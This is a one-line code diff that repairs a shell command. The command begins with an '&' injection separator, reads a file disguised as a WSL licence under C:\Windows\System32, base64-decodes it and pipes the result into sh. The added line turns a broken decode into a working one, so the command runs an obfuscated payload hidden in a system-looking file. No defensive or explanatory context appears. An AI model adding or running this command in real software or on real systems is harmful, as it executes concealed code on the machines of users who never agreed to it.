@@ -1,1 +1,1 @@
-& cat C:\Windows\System32\wsl.licence | base64.exe - | sh
+& cat C:\Windows\System32\wsl.licence | base64.exe -d | sh
